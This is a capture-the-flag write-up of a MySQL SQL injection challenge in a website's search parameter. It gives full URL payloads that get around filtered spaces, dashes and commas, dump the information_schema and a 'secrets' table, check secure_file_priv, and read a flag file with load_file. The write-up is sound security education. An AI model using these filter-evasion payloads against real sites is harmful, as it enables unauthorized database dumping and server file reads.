# **The after-Prequal (971pts) (19 Solves)**

![TASK](https://imgur.com/pXLjH4n.png)

This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let's start the exploitation of the famous SQL injection :D

![TASK](https://imgur.com/B2IbSxr.png)

After the basic enumeration we can notice that these characters are filtered : **[" ","-",","]** so we will use the following bypasses:

1. The white space : **%0A**
2. The "-" : we will use **#** to comment 
3. The "," : we will use join to bypass it

This step took me some time , after some tries i succeeded in equilibrating the query :

 > ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23
 
 ![TASK]( https://imgur.com/5VSI80e.png)

And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual

1. Tables:

> ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23

**Table name**: secrets

 ![TASK](https://imgur.com/m190lNI.png)

2. Columns:

> ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name="secrets")b%0Ajoin%0A(select%0A3)c)%0A%23
 
 The interesting **Column name** : value

 ![TASK](https://imgur.com/TegJtmS.png)

And finally :

> ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23
 
 ![TASK](https://imgur.com/8ycD4ru.png)

Damn no flag for us :'( but no problem maybe if we just do load_file("flag.txt") we will have the flag ? unfortunately it wont work, in fact it's not that easy and this is the most juicy part of the task xd
i checked the privileges of the current user and the FILE permission was not grantable ! wtf , this result was unpredictable for me so i started digging in mysql file permissions docs until i found this :D 
 
![TASK](https://imgur.com/TgUXftd.png)

>  To limit the location in which files can be read and written, set the **secure_file_priv** system variable to a specific directory. See Section 5.1.8, “Server System Variables”. 

So probably the author have set a custom location in the global variable **secure_file_priv** , let's check its value in @@GLOBAL.secure_file_priv

>?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23

![TASK](https://imgur.com/Pdn180B.png)

BINGOOO ! so let's have our flag now : 

> ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file("/var/lib/mysql-files/flag/flag.txt"))b%0Ajoin%0A(select%0A3)c)%0A%23

**FLAG** : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don't hesitate to ask me on twitter @BelkahlaAhmed1 :D
